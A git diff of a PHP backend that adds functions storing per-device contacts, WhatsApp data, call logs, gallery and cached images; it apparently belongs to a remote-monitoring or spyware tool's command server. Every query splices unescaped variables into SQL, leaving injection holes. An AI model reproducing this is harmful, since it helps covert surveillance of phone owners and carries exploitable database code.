@@ -1,8 +1,7 @@
 <?php
 require("connect.php");
-header('Content-Type: application/json');
 if($conn->connect_error)
-  echo "db error";
+    echo "db error";
 //else echo "db connected";
 
 function add_device($msg,$socket){
@@ -13,6 +12,7 @@ function add_device($msg,$socket){
     echo "device error:".mysqli_error($conn);
   }else{
     echo "new device added";
+    return 1;
   }
   $query="INSERT INTO active values('".$msg->id."','".$socket."','$msg->connection')";
   echo "adding at $socket";
@@ -104,6 +104,56 @@ function battery_report($dev,$perc){
     //echo "image added";
   }
 }
+
+function update_contacts($dev,$fname){
+  require("connect.php");
+  $query="UPDATE devices set saved_contacts='$fname' where device_id='$dev'";
+  if(!$conn->query($query)){
+    echo "error".mysqli_error($conn);
+  }else{
+    //echo "image added";
+  }
+}
+
+function update_whatsapp($dev,$fname){
+  require("connect.php");
+  $query="UPDATE devices set saved_whatsapp='$fname' where device_id='$dev'";
+  if(!$conn->query($query)){
+    echo "error".mysqli_error($conn);
+  }else{
+    //echo "image added";
+  }
+}
+
+function update_image($id,$img){
+  require("connect.php");
+  $query="UPDATE file_system set cached='$img'  where id=$id";
+  if(!$conn->query($query)){
+    echo "error".mysqli_error($conn);
+  }else{
+    //echo "image added";
+  }
+}
+
+function update_gallery($dev){
+  require("connect.php");
+  $query="UPDATE devices set saved_gallery='1' where device_id='$dev'";
+  if(!$conn->query($query)){
+    echo "error".mysqli_error($conn);
+  }else{
+    //echo "image added";
+  }
+}
+function update_calllog($dev,$fname){
+  require("connect.php");
+  $query="UPDATE devices set saved_calllog='$fname' where device_id='$dev'";
+  if(!$conn->query($query)){
+    echo "error".mysqli_error($conn);
+  }else{
+    //echo "image added";
+  }
+}
+
 function truncate(){
   require("connect.php");
   $query="truncate active;";
